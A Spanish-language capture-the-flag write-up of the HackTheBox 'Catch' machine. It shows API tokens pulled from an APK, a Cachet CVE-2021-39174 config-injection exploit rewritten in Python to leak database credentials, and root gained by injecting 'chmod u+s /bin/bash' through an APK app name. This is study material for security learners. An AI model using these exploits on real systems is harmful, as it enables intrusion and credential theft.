# 10.10.11.150 - Catch
![Catch](https://user-images.githubusercontent.com/96772264/210348824-9e4b7927-4503-4592-9d1e-2b1fda86d579.png)

----------------------

# Part 1: Enumeración

Puertos abiertos 22, 80(http), 3000, 5000, 8000(http)

```console
└─$ whatweb http://10.10.11.150:8000
Apache[2.4.29], Cookies[XSRF-TOKEN,laravel_session], HttpOnly[laravel_session], Laravel, Open-Graph-Protocol[website], Script[text/javascript], Title[Catch Global Systems], X-UA-Compatible[IE=edge]
└─$ whatweb http://10.10.11.150     
Apache[2.4.41], Script, Title[Catch Global Systems]
```

Fuzzing:
Web del puerto 8000:
![catch1](https://user-images.githubusercontent.com/96772264/210348993-8e2c6ead-d241-4966-8b7e-a8281e50dd0d.PNG)

```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.150:8000/FUZZ/
000000025:   301        9 L      28 W       317 Ch      "img"
000000152:   500        71 L     206 W      3169 Ch     "subscribe"
000000245:   302        11 L     22 W       386 Ch      "admin"
000000468:   403        9 L      28 W       279 Ch      "storage"
000001489:   301        9 L      28 W       318 Ch      "dist"
000001884:   302        11 L     22 W       382 Ch      "setup"
# No hay .php
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.150:5000/FUZZ/
```
Hago fuzzing también en el puerto 80, pero no encuentro nada, la web es muy simple y solo nos ofrece la descarga de una apk "catchv1.0.apk"
![catch2](https://user-images.githubusercontent.com/96772264/210348961-dd2e5f89-14e7-4e4a-8393-ddf57498a9b4.PNG)

-----------------------
# Part 2: La apk

Hay una ruta interesante llamada "./res/values/strings.xml"
```console
└─$ java -jar apktool.jar d catchv1.0.apk
└─$ cat ./res/values/strings.xml
<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
<string name="slack_token">xoxp-23984754863-2348975623103</string>
```

Otra cosa interesante al hacer con un apk es abrir el codigo con herramientas como jadx-gui (desensamblador) donde se leakea este subdominio 
```https://status.catch.htb/``` Pero aunque lo pongo en el /etc/hosts devuelve un 404 not found.
![catch3](https://user-images.githubusercontent.com/96772264/210349398-312e3860-f926-4091-8834-b5d27681c73a.PNG)

-----------------------
# Part 3: Lets chat api

Cuando entro en lets_chat me sale un panel de login (puerto 3000)
![catch5](https://user-images.githubusercontent.com/96772264/210349297-9008b060-a6a9-4c6c-a7fe-2dc26e7181f0.PNG)

Si busco en google como usar el token ```lets chat token``` la primera entrada es un repo de github que habla de una api. (aunque no exite la ruta /api)
En la misma web nos habla que la api tiene varias rutas:  
- Authentication  
- Rooms: GET /rooms, GET /rooms/:room, POST /rooms, PUT /rooms/:room, DELETE /rooms/:room, GET /rooms/:room/users  
- Messages: GET /messages, POST /messages, GET /rooms/:room/messages, POST /rooms/:room/messages  
- Files: GET /files, GET /rooms/:room/files  
- Users: GET /users, GET /users/:user  
- Account: GET /account  

Si probamos por ejemplo com /rooms
```console
└─$ curl -s -X GET http://10.10.11.150:5000/rooms
Unauthorized 
└─$ curl -s -X GET http://10.10.11.150:5000/rooms -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq
```
Estructura de la API:

- /files no tiene nada /messages tampoco  
- /account -> Somos "Administrator (admin)" con el avatar e2b5310ec47bba317c5f1b5889e96f04 (ni idea) que puede acceder a 3 rooms  
- /users  
  * Administrator/Admin (61b86aead984e2451036eb16) puede acceder a todas las rooms (3)  
  * John Smith (61b86dbdfe190b466d476bf0): puede acceder a dos de las tres salas  
  * Will Robinson (61b86e40fe190b466d476bf2): igual  
  * Lucas (61b86f15fe190b466d476bf5): tambien, solo dos salas  
- /rooms  
  * Status/Cachet Updates and Maintenance (61b86b28d984e2451036eb17)  
  * android_dev/Android App Updates, Issues & More (61b86aead984e2451036eb16)  
  * Employees/New Joinees, Org updates (61b86b3fd984e2451036eb18)  

Mensajes:  
```console
# Status
└─$ curl -s -X GET http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq '.[].text'

Varios mensajes hablando de que deben actualizar cosas como bases de datos y demas (...)
"@john seria posible añadir SSL para nuestro dominio (status) para verificar que todo es seguro?
"Si, aquí estarían los credenciales: `john :  E}V!mywu_69T4C}W`"
"Genial, un segundo..."
"Me podrias crear tu la cuenta? "
"Hey equipo, me encargaré de status.catch.htb desde ahora, decidme si necesitais algo"

# Employees
└─$ curl -s -X GET http://10.10.11.150:5000/rooms/61b86b3fd984e2451036eb18/messages -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq '.[].text'
Ningun mensaje interesante mas que que el admin se llama Lucas

# andoid_dev -> Not found
```

-----------------------
# Part 4: Cachet CVE

Con ssh la contraseña da acceso denegado pero para el cachet (puerto 8000 /auth/login) si que va.
![catch7](https://user-images.githubusercontent.com/96772264/210349647-e5ce57dd-8552-4ca3-9fd2-d792676889b8.PNG)

Busco ```Cachet exploits``` en google y doy con esta [web](https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/)
que me habla de varios, entre ellos CVE-2021-39174. Busco ```CVE-2021-39174 Poc``` y doy con [este](https://github.com/n0kovo/CVE-2021-39174-PoC)
Luego al final lo explico

```console
└─$ python3 exploit.py -p 'E}V!mywu_69T4C}W' -n "john" -u "http://10.10.11.150:8000" 
- APP_KEY		= base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
- DB_DRIVER		= mysql
- DB_HOST		= localhost
- DB_DATABASE		= cachet
- DB_USERNAME		= will
- DB_PASSWORD		= s2#4Fg0_%3!
```
Estas creds sirven para hacer SSH a la máquina como Will
```console
└─$ sshpass -p 's2#4Fg0_%3!' ssh will@10.10.11.150
```
-----------------------
# Part 5: En el sistema

Subimos dos [herramientas](https://github.com/CUCUxii/Pentesting-tools) al sistema 
Si enumeramos el sistema con lin_info_xii.sh, dice que varias veces se ha corrido  "_ /bin/bash /root/check.sh" pero no podemos acceder a el.  
Con procmon.sh vemos que corre "/opt/mdm/verify.sh"  

El script es tal que asi:
```bash
#!/bin/bash

# Cleanup #
cleanup() { rm -rf /root/mdm/process_bin;rm -rf "/opt/mdm/apk_bin/*" "/root/mdm/apk_bin/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh }

# MDM CheckerV1.0 #
for IN_APK_NAME in /opt/mdm/apk_bin/*.apk; do
	OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
	APK_NAME="$(openssl rand -hex 12).apk"
	if [[ -L "$IN_APK_NAME" ]]; then
		exit
	else
		mv "$IN_APK_NAME" "/root/mdm/apk_bin/$APK_NAME"
	fi
	sig_check /root/mdm/apk_bin $APK_NAME
	comp_check /root/mdm/apk_bin $APK_NAME /root/mdm/process_bin
	app_check /root/mdm/process_bin /root/mdm/certified_apps /root/mdm/apk_bin $OUT_APK_NAME
done
cleanup
```
Por cada aplicacion de /opt/mdm/apk_bin/ la mete en /root/mdm/apk_bin/ y hace pasar ciertas verificaciones 
La manera de hacerle reversing es probando dichos comandos en nuestro sistema con por ejemplo Catch.apk

### Funcion sig_check:
```bash
sig_check() {
	jarsigner -verify "/root/mdm/apk_bin/$APK_NAME" 2>/dev/null >/dev/null
	if [[ $? -eq 0 ]]; then
		echo '[+] Signature Check Passed'
	else
		echo '[!] Signature Check Failed. Invalid Certificate.'; cleanup; exit
	fi; }
```

```console
└─$ jarsigner -verify "catchv1.0.apk" 2>/dev/null >/dev/null
┌──(cucuxii㉿kali-xii)-[~/Maquinas/htb/Catch]
└─$ echo "$?"
0
```
Catch.apk la pasaría.

### Funcion com_check
```bash
comp_check() {
	apktool d -s "/root/mdm/apk_bin $APK_NAME" -o $3 2>/dev/null >/dev/null
    COMPILE_SDK_VER=$(grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "/root/mdm/process_bin/AndroidManifest.xml")
	    if [ -z "$COMPILE_SDK_VER" ]; then  
	        echo '[!] Failed to find target SDK version.'; cleanup; exit
	    else
	        if [ $COMPILE_SDK_VER -lt 18 ]; then
		    	echo "[!] APK Doesn't meet the requirements"; cleanup; exit
		fi; fi;}
```
Valida que en el AndroidManifest.xml este el campo compileSdkVersion y sea mayor que 18, tambien lo pasa.
```console
└─$ cat catchv1.0/AndroidManifest.xml | grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+"
32
```

### Funcion app_check

```bash
app_check() {
	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
    echo $APP_NAME
    if [[ $APP_NAME == *"Catch"* ]]; then
	    echo -n $APP_NAME | xargs -I {} sh -c 'mkdir {}'
        mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
    else
        echo "[!] App doesn't belong to Catch Global"; cleanup; exit
	fi; }
```
Si ve que en ./res/values/strings.xml pone el nombre de la apk y tiene la string Catch dentro, te hace el comando de bash de crear una carpeta con dicho nombre

```console
└─$ cat ./res/values/strings.xml | grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+"
Catch
└─$ echo -n Catch | xargs -I {} sh -c 'mkdir {}';
```
El bug del script es el ```"if [[ $APP_NAME == *"Catch"* ]]; then``` ya que se peuden concatenar mas comandos. 
```console
└─$ echo -n 'Catch; touch "Hola_Mundo"' | xargs -I {} sh -c 'mkdir {}'; 
└─$ ls
 Catch   original   res   smali   AndroidManifest.xml   apktool.yml   Hola_Mundo
```

```console
cucuxii@kali-xii:~/Maquinas/htb/Catch/catchv1.0$ vim ./res/values/strings.xml
30     <string name="app_name">Catch; chmod u+s /bin/bash</string>
└─$ java -jar apktool.jar b catchv1.0 -o cucuxii.apk
will@catch:/tmp$ cd /opt/mdm/apk_bin
will@catch:/opt/mdm/apk_bin$ curl -s http://10.10.14.16/cucuxii.apk -O
will@catch:/opt/mdm/apk_bin$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
will@catch:/opt/mdm/apk_bin$ bash -p
bash-5.0# whoami
root
```

# Extra: replicando el exploit.

En la web, hay un panel de configuracion donde puedes cambiar cosas del email de cachet "/dashboard/settings/mail". Si en el campo config[mail_address] 
le pones varaibles de entorno del tipo ${DB_HOST} te las filtra. He replicado el exploit que he encontrado reprogramandolo yo mismo.

```python
import requests, re
from sys import exit
from random import randint

url = "http://10.10.11.150:8000/"
sess = requests.session()
variables = ["APP_KEY", "DB_HOST", "DB_DATABASE", "DB_USERNAME", "DB_PASSWORD"]

# 1. Obtenemos el CSRF token
req = sess.get(url)
token = re.findall(r'<meta name="token" content="(.*?)">',req.text)[0]

# 2. Login
login_url = url + "auth/login"
data = {"_token": token, "username": "john", "password": "E}V!mywu_69T4C}W"}
req2 = sess.post(login_url, data=data)
if "auth/logout" in req2.text:
	print("[+] Logueados")

# 3. Postear data
url_settings = url + "dashboard/settings/mail"
values = {"mail_driver":"smtp", "mail_host":"",
		"mail_address":"notify@10.129.136.74", "mail_username":"", "mail_password":""}
payload = "".join(['${{{0}}}<x>'.format(x) for x in variables])
payload = f"{randint(1000000000, 9999999999)}<x>{payload}"

def post_data(values, payload, url_settings):
	multipart_data = {'_token': (None, token),
					'config[mail_driver]': (None, values["mail_driver"]),
					'config[mail_host]': (None, values["mail_host"]),
					'config[mail_address]': (None, payload),
					'config[mail_username]': (None, values["mail_username"]),
					'config[mail_password]': (None, values["mail_password"])
					}
	req3 = sess.post(url_settings, files=multipart_data, timeout=20)

post_data(values, payload, url_settings)

# 5. Extraer variables
req4 = sess.get(url_settings)
while "base64" not in req4.text:
	req4 = sess.get(url_settings)
print("[*] Variables extraidas: ")
dotenv = re.findall(r'value="(.*?)"',req4.text)[10]
dotenvs = dotenv.split("&lt;x&gt;")
zipped = list(zip(variables, dotenvs))
print(zipped)

# 6: Limpiar todo
payload = ""
post_data(values, payload, url_settings)
```
```console
└─$ python3 eexploit.py
[+] Logueados
[*] Variables extraidas:
[('APP_KEY', '7822527115'), ('DB_HOST', 'base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA='), ('DB_DATABASE', 'localhost'), ('DB_USERNAME', 'cachet'), ('DB_PASSWORD', 'will')]
```
